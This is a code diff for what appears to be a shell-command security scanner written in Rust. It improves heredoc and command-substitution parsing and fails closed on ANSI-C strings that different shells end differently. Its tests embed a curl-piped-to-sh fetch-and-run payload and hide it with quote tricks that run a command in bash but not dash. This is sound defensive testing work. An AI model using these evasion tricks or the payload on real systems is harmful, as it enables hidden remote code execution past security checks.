@@ -4063,16 +4063,42 @@ fn starts_zsh_numeric_glob(bytes: &[u8]) -> bool {
     bytes.get(dash) == Some(&b'-') && bytes.get(after_digits(dash + 1)) == Some(&b'>')
 }
 
+/// What [`posix_heredoc_specs`] is inside of at the end of a line, carried to
+/// the next line.
+#[derive(Clone, PartialEq, Eq)]
+struct PosixHeaderLex {
+    quote: ShellLexQuote,
+    /// The `$(` bodies opened inside double quotes, innermost last, each with
+    /// the number of `(` still open in it. The shells read such a body as
+    /// code with its own quotes, so `"$(cat <<'EOF'` opens a heredoc, and its
+    /// closing `)` resumes the double-quoted text.
+    double_quoted_bodies: Vec<usize>,
+}
+
+impl Default for PosixHeaderLex {
+    fn default() -> Self {
+        Self {
+            quote: ShellLexQuote::Normal,
+            double_quoted_bodies: Vec::new(),
+        }
+    }
+}
+
 fn posix_heredoc_specs(
     line: &str,
-    initial_quote: ShellLexQuote,
-) -> (Vec<PosixHeredocSpec>, bool, ShellLexQuote) {
+    initial: PosixHeaderLex,
+) -> (Vec<PosixHeredocSpec>, bool, PosixHeaderLex) {
     let bytes = line.as_bytes();
     let mut specs = Vec::new();
-    let mut quote = initial_quote;
+    let PosixHeaderLex {
+        mut quote,
+        mut double_quoted_bodies,
+    } = initial;
     let mut unsupported = false;
     let mut index = 0usize;
     let mut word_start = true;
+    // The run of unescaped `$` just before `index` in double-quoted text.
+    let mut dollar_run = 0usize;
     while index < bytes.len() {
         let byte = bytes[index];
         match quote {
@@ -4085,12 +4111,20 @@ fn posix_heredoc_specs(
             }
             ShellLexQuote::Double => {
                 if byte == b'\\' && index + 1 < bytes.len() {
+                    dollar_run = 0;
                     index += 2;
                     continue;
                 }
                 if byte == b'"' {
                     quote = ShellLexQuote::Normal;
+                } else if byte == b'(' && dollar_run % 2 == 1 {
+                    // `$(` after an odd run of `$` (`$$(` is the PID and a
+                    // plain `(` in every shell): code until its `)`.
+                    double_quoted_bodies.push(1);
+                    quote = ShellLexQuote::Normal;
+                    word_start = true;
                 }
+                dollar_run = if byte == b'$' { dollar_run + 1 } else { 0 };
                 index += 1;
                 continue;
             }
@@ -4132,6 +4166,23 @@ fn posix_heredoc_specs(
             word_start = false;
             continue;
         }
+        if matches!(byte, b'(' | b')') {
+            if let Some(open) = double_quoted_bodies.last_mut() {
+                if byte == b'(' {
+                    *open += 1;
+                } else {
+                    *open -= 1;
+                }
+                if *open == 0 {
+                    double_quoted_bodies.pop();
+                    quote = ShellLexQuote::Double;
+                    dollar_run = 0;
+                }
+                word_start = byte == b'(';
+                index += 1;
+                continue;
+            }
+        }
         if bytes.get(index..index + 2) != Some(b"<<") {
             word_start = matches!(byte, b' ' | b'\t' | b';' | b'&' | b'|');
             index += 1;
@@ -4170,7 +4221,14 @@ fn posix_heredoc_specs(
     // heredoc operator. If a real heredoc header itself leaves a quote open,
     // its body boundary is ambiguous and must remain fail-closed.
     let quote_ambiguous_for_heredoc = !specs.is_empty() && quote != ShellLexQuote::Normal;
-    (specs, unsupported || quote_ambiguous_for_heredoc, quote)
+    (
+        specs,
+        unsupported || quote_ambiguous_for_heredoc,
+        PosixHeaderLex {
+            quote,
+            double_quoted_bodies,
+        },
+    )
 }
 
 fn mask_non_newline(bytes: &mut [u8], range: std::ops::Range<usize>) {
@@ -4319,19 +4377,166 @@ fn heredoc_interpreter_for_header(
         mask_non_newline(&mut masked, spec.operator_range.clone());
     }
     let masked = String::from_utf8(masked).ok()?;
-    let segment = tokenize::tokenize(&masked, ShellType::Posix)
+    let operator = target.operator_range.start;
+    // The tokenizer does not split inside `$(...)`, so for an operator in a
+    // substitution, subshell or backtick body (`x="$(sh <<'EOF'`) the
+    // command that reads the heredoc is found in that body.
+    heredoc_consumer_shell(&masked, operator).or_else(|| {
+        let body = posix_innermost_open_body(&masked, operator)?;
+        heredoc_consumer_shell(masked.get(body.clone())?, operator - body.start)
+    })
+}
+
+/// The shell that reads the heredoc whose operator starts at `operator` in
+/// the (operator-masked) header `line` from stdin, if any.
+fn heredoc_consumer_shell(line: &str, operator: usize) -> Option<ShellType> {
+    let segment = tokenize::tokenize(line, ShellType::Posix)
         .into_iter()
-        .find(|segment| {
-            segment.byte_range.start <= target.operator_range.start
-                && target.operator_range.start <= segment.byte_range.end
-        })
+        .find(|segment| segment.byte_range.start <= operator && operator <= segment.byte_range.end)
         .or_else(|| {
-            tokenize::tokenize(&masked, ShellType::Posix)
+            tokenize::tokenize(line, ShellType::Posix)
                 .into_iter()
                 .next()
         })?;
     let (command, args) = resolve_wrapped_command_for_shell(&segment, ShellType::Posix)?;
     shell_reads_heredoc_from_stdin(&command, &args)
+}
+
+/// The byte range of the innermost `(`, `$(`, `<(`, `>(` or backtick body
+/// that is open at `at` on a heredoc header line, up to its closer on that
+/// line or the line end, read from code at the line start. `None` when `at`
+/// sits in no such body. In double quotes only `$(` and a backtick open one.
+fn posix_innermost_open_body(line: &str, at: usize) -> Option<std::ops::Range<usize>> {
+    #[derive(Clone, Copy, PartialEq, Eq)]
+    enum Kind {
+        Top,
+        Paren,
+        Backtick,
+    }
+    struct Frame {
+        kind: Kind,
+        start: usize,
+        quote: ShellLexQuote,
+    }
+    let bytes = line.as_bytes();
+    let mut frames = vec![Frame {
+        kind: Kind::Top,
+        start: 0,
+        quote: ShellLexQuote::Normal,
+    }];
+    // The frame count and body start at `at`.
+    let mut target: Option<(usize, usize)> = None;
+    let mut word_start = true;
+    let mut dollar_run = 0usize;
+    let mut index = 0usize;
+    while index < bytes.len() {
+        if target.is_none() && index >= at {
+            let frame = frames.last()?;
+            if frame.kind == Kind::Top {
+                return None;
+            }
+            target = Some((frames.len(), frame.start));
+        }
+        let byte = bytes[index];
+        let frame = frames.last_mut()?;
+        let closes = match frame.quote {
+            // The shells cut a backtick body out at its first unescaped
+            // backtick before they read its quotes.
+            ShellLexQuote::Single | ShellLexQuote::Double
+                if byte == b'`' && frame.kind == Kind::Backtick =>
+            {
+                true
+            }
+            ShellLexQuote::Single => {
+                if byte == b'\'' {
+                    frame.quote = ShellLexQuote::Normal;
+                }
+                false
+            }
+            ShellLexQuote::Double => match byte {
+                b'\\' => {
+                    index += 1;
+                    false
+                }
+                b'"' => {
+                    frame.quote = ShellLexQuote::Normal;
+                    false
+                }
+                b'`' => {
+                    frames.push(Frame {
+                        kind: Kind::Backtick,
+                        start: index + 1,
+                        quote: ShellLexQuote::Normal,
+                    });
+                    word_start = true;
+                    false
+                }
+                b'(' if dollar_run % 2 == 1 => {
+                    frames.push(Frame {
+                        kind: Kind::Paren,
+                        start: index + 1,
+                        quote: ShellLexQuote::Normal,
+                    });
+                    word_start = true;
+                    false
+                }
+                _ => false,
+            },
+            ShellLexQuote::Normal => match byte {
+                b'\\' => {
+                    index += 1;
+                    word_start = false;
+                    false
+                }
+                b'\'' => {
+                    frame.quote = ShellLexQuote::Single;
+                    word_start = false;
+                    false
+                }
+                b'"' => {
+                    frame.quote = ShellLexQuote::Double;
+                    word_start = false;
+                    false
+                }
+                // A comment: no operator after it on this line.
+                b'#' if word_start => return target.map(|(_, start)| start..index),
+                b'`' if frame.kind == Kind::Backtick => true,
+                b'`' => {
+                    frames.push(Frame {
+                        kind: Kind::Backtick,
+                        start: index + 1,
+                        quote: ShellLexQuote::Normal,
+                    });
+                    word_start = true;
+                    false
+                }
+                b'(' => {
+                    frames.push(Frame {
+                        kind: Kind::Paren,
+                        start: index + 1,
+                        quote: ShellLexQuote::Normal,
+                    });
+                    word_start = true;
+                    false
+                }
+                b')' if frame.kind == Kind::Paren => true,
+                _ => {
+                    word_start = matches!(byte, b' ' | b'\t' | b';' | b'&' | b'|');
+                    false
+                }
+            },
+        };
+        if closes {
+            if let Some((_, start)) = target.filter(|(depth, _)| frames.len() == *depth) {
+                return Some(start..index);
+            }
+            frames.pop();
+            word_start = false;
+        }
+        dollar_run = if byte == b'$' { dollar_run + 1 } else { 0 };
+        index += 1;
+    }
+    target.map(|(_, start)| start..bytes.len())
 }
 
 /// Where a heredoc's body ends.
@@ -4415,14 +4620,15 @@ fn recover_posix_heredocs(raw: &str) -> PosixHeredocRecovery {
     let mut masked = raw.as_bytes().to_vec();
     let mut cursor = 0usize;
     let mut count = 0usize;
-    let mut header_quote = ShellLexQuote::Normal;
+    let mut header_lex = PosixHeaderLex::default();
     while cursor < raw.len() {
         let header_end = raw[cursor..]
             .find('\n')
             .map_or(raw.len(), |offset| cursor + offset);
         let header = raw.get(cursor..header_end).unwrap_or_default();
-        let (mut specs, unsupported, final_quote) = posix_heredoc_specs(header, header_quote);
-        header_quote = final_quote;
+        let (mut specs, unsupported, final_lex) =
+            posix_heredoc_specs(header, std::mem::take(&mut header_lex));
+        header_lex = final_lex;
         for spec in &mut specs {
             spec.operator_range =
                 (spec.operator_range.start + cursor)..(spec.operator_range.end + cursor);
@@ -9392,22 +9598,50 @@ fn posix_plain_braced_name(rest: &[u8]) -> bool {
     name > 0 && rest.get(name) == Some(&b'}')
 }
 
-/// POSIX text the shells may read in different ways: a `$$` before `{` or
-/// `(`, or a backslash-newline inside a `$(`, `${`, `<(` or `>(` (see
-/// [`lexical_executable_substitutions_bounded`]). Neither quotes nor `${...}`
-/// scopes are tracked, so this matches more than the scan's gap: callers use
-/// it to read more, never less.
-pub(crate) fn posix_text_reads_differently_across_shells(text: &str) -> bool {
-    let bytes = text.as_bytes();
-    (0..bytes.len()).any(|index| match bytes[index] {
-        b'$' => {
-            posix_expansion_split_by_line_continuation(bytes, index)
-                || (index > 0
-                    && bytes[index - 1] == b'$'
-                    && matches!(bytes.get(index + 1), Some(b'{' | b'(')))
+/// `bytes[quote]` is the `'` of a `$'` (after an odd run of `$`). bash, zsh
+/// and ksh read an ANSI-C string there, where a backslash escapes the next
+/// byte; dash reads a `$` and a plain single-quoted string, which the first
+/// `'` closes. The two end in different places when a `\'` sits in the
+/// string (`$'a\'' ; cmd # '` runs `cmd` in bash only). Matches
+/// `tokenize::PosixReadings::ansi_c_escaped_quotes`.
+fn posix_ansi_c_string_reads_differently(bytes: &[u8], quote: usize) -> bool {
+    let mut index = quote + 1;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'\\' if bytes.get(index + 1) == Some(&b'\'') => return true,
+            b'\\' => index += 2,
+            b'\'' => return false,
+            _ => index += 1,
         }
-        b'<' | b'>' => posix_expansion_split_by_line_continuation(bytes, index),
-        _ => false,
+    }
+    false
+}
+
+/// A `$'...'` string in a backtick body that the shells end in different
+/// places ([`posix_ansi_c_string_reads_differently`]), read in the body as
+/// the shells unescape it (`\\`, `` \` `` and `\$` lose their backslash, so
+/// `\\'` there is `\'`). The body's own scan reads its raw text. Quotes in
+/// the body are not tracked, so this matches more, never less.
+fn posix_backtick_body_ansi_c_differs(body: &str) -> bool {
+    if !body.contains("$'") {
+        return false;
+    }
+    let mut bytes = Vec::with_capacity(body.len());
+    let mut raw = body.bytes();
+    while let Some(byte) = raw.next() {
+        match (byte, raw.clone().next()) {
+            (b'\\', Some(next @ (b'\\' | b'`' | b'$'))) => {
+                bytes.push(next);
+                raw.next();
+            }
+            _ => bytes.push(byte),
+        }
+    }
+    let mut dollars = 0usize;
+    (0..bytes.len()).any(|index| {
+        let quote = bytes[index] == b'\'' && dollars % 2 == 1;
+        dollars = if bytes[index] == b'$' { dollars + 1 } else { 0 };
+        quote && posix_ansi_c_string_reads_differently(&bytes, index)
     })
 }
 
@@ -9578,6 +9812,9 @@ fn lexical_executable_substitutions_bounded(
                         break;
                     };
                     if let Some(body) = raw.get(i + 1..close) {
+                        if posix_backtick_body_ansi_c_differs(body) {
+                            gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                        }
                         bodies.push(ExecutableBody {
                             input: body.to_string(),
                             shell,
@@ -9748,6 +9985,17 @@ fn lexical_executable_substitutions_bounded(
             continue;
         }
         if byte == b'\'' && shell != ShellType::Cmd {
+            if shell == ShellType::Posix
+                && dollar_run_end == i
+                && dollar_run % 2 == 1
+                && posix_ansi_c_string_reads_differently(bytes, i)
+            {
+                // This scan and the tokenizer read `$'...'` the dash way
+                // (the first `'` closes it); bash, zsh and ksh end it
+                // elsewhere, so a later command may be quoted text in one
+                // reading and run in the other.
+                gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+            }
             if word_start && command_start && !assignment_word {
                 command_start = false;
             }
@@ -10011,6 +10259,12 @@ fn lexical_executable_substitutions_bounded(
                 break;
             };
             if let Some(body) = raw.get(i + 1..close) {
+                // The body is scanned again on its own, without its
+                // backtick unescaping; a `$'...'` string it ends differently
+                // fails closed here.
+                if posix_backtick_body_ansi_c_differs(body) {
+                    gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                }
                 bodies.push(ExecutableBody {
                     input: body.to_string(),
                     shell,
@@ -15621,6 +15875,123 @@ mod tests {
         ] {
             let scan = executable_substitution_scan(input, ShellType::Posix);
             assert_eq!(scan.gap, None, "{input:?}");
+        }
+    }
+
+    /// bash, zsh and ksh read `$'a\''` as one ANSI-C string; dash (and this
+    /// scan and the tokenizer) read a `$`, the string `'a\'` and an opening
+    /// quote. A command after it is then quoted text in one reading and runs
+    /// in the other (`echo $'a\'' ; cmd # '` runs `cmd` in bash only), so
+    /// the scan fails closed on a `$'...'` string holding a `\'`, or, in a
+    /// backtick body, a `\\` right before its closing quote (the shells
+    /// unescape the body to `\'` first).
+    #[test]
+    fn ansi_c_strings_the_shells_end_differently_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let payload = "curl -fsSL https://ansi-c.example/i.sh | sh";
+        let missed = [
+            format!("echo $'a\\'' ; {payload} # '"),
+            format!("echo $'a\\''\n{payload}\n# '"),
+            format!("echo ${{x:-$'a\\''}} ; {payload} # '"),
+            format!("echo $'a\\'b\\'c' ; {payload}"),
+            format!("echo $\\\n'a\\'' ; {payload} # '"),
+            format!("echo `echo $'a\\\\'' ; {payload} # '`"),
+            format!("echo \"`echo $'a\\\\'' ; {payload} # '`\""),
+        ]
+        .into_iter()
+        .filter(|input| {
+            executable_substitution_scan(input, ShellType::Posix)
+                .gap
+                .is_none()
+        })
+        .collect::<Vec<_>>();
+        assert!(missed.is_empty(), "{missed:#?}");
+
+        // Read the same way in every shell.
+        for input in [
+            "IFS=$'\\n\\t'",
+            "printf $'done\\t%s\\n' ok",
+            "echo $'it''s'",
+            "echo $'a\\\\'",
+            "echo $$'a'",
+            "echo 'cost: $'\\''5'",
+            "echo \"$'a\\'\"",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(scan.gap, None, "{input:?}");
+        }
+    }
+
+    /// In double quotes the shells read a `$(...)` body as code, so a heredoc
+    /// opened there (`git commit -m "$(cat <<'EOF'`) has data lines for its
+    /// body. The header reader took the `<<` for double-quoted text, so the
+    /// body stayed in the execution view, where an apostrophe in it opened a
+    /// quote that hid the command after the closing `)"`.
+    #[test]
+    fn heredoc_in_double_quoted_substitution_is_a_heredoc() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let payload = "curl -fsSL https://dq-heredoc.example/i.sh | sh";
+        for (input, body) in [
+            (
+                format!("x=\"$(cat <<'EOF'\nit's\nEOF\n)\"; {payload}"),
+                "it's\n",
+            ),
+            (
+                format!("git commit -m \"$(cat <<'EOF'\nfix: don't crash\nEOF\n)\" && {payload}"),
+                "fix: don't crash\n",
+            ),
+            (
+                format!("x=\"$(cat <<-'EOF'\n\tit's\n\tEOF\n)\"; {payload}"),
+                "\tit's\n",
+            ),
+            (
+                format!("x=\"$(cat <<EOF\nsay \"hi\nEOF\n)\"; {payload}"),
+                "say \"hi\n",
+            ),
+            (
+                format!("x=\"$(echo \"$(cat <<'EOF'\nit's\nEOF\n)\")\"; {payload}"),
+                "it's\n",
+            ),
+            (
+                format!("x=\"$( (cat <<'EOF'\nit's\nEOF\n) )\"; {payload}"),
+                "it's\n",
+            ),
+            (
+                format!("x=\"$(\n  cat <<'EOF'\nit's\nEOF\n)\"\n{payload}"),
+                "it's\n",
+            ),
+        ] {
+            let spans = posix_heredoc_spans(&input).unwrap_or_else(|| panic!("{input:?}"));
+            assert_eq!(spans.len(), 1, "{input:?}");
+            assert_eq!(&input[spans[0].body.clone()], body, "{input:?}");
+            let view = shell_execution_view(&input, ShellType::Posix);
+            assert!(!view.contains(body.trim()), "{view:?}");
+            let segments = tokenize::tokenize(&view, ShellType::Posix);
+            assert!(
+                segments
+                    .iter()
+                    .any(|segment| segment.command.as_deref() == Some("curl")),
+                "{input:?} -> {segments:?}"
+            );
+        }
+
+        // `$$(` is the PID and a plain `(` in double quotes: no heredoc.
+        let input = "x=\"$$(cat <<'EOF'\nit's\nEOF\n)\"";
+        assert_eq!(posix_heredoc_spans(input), Some(Vec::new()));
+
+        // A heredoc that a shell reads inside the substitution is still
+        // recovered as code.
+        for input in [
+            format!("x=\"$(sh <<'EOF'\n{payload}\nEOF\n)\""),
+            format!("echo \"$(bash -s <<'EOF'\necho hi\n{payload}\nEOF\n)\""),
+            format!("x=$(bash <<'EOF'\n{payload}\nEOF\n)"),
+            format!("x=\"$(echo `sh <<'EOF'\n{payload}\nEOF\n`)\""),
+        ] {
+            let bodies = executable_substitutions(&input, ShellType::Posix);
+            assert!(
+                bodies.iter().any(|body| body.contains(payload)),
+                "{input:?} -> {bodies:?}"
+            );
         }
     }
 
